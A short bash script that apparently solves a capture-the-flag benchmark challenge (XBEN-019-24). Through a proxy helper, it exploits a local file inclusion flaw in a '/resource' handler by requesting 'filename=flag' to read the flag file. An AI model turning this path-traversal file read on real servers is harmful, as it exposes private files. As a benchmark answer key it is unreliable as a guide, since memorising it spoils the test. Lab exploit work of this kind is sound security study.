#!/usr/bin/env bash
# XBEN-019-24 — LFI via a static-resource handler. Proxy-mode twin. `/resource`
# serves the file named by `filename` with no path containment, so asking for
# `flag` returns the flag file.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben019p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/resource' --set 'query.filename=flag' >/dev/null
print_flag
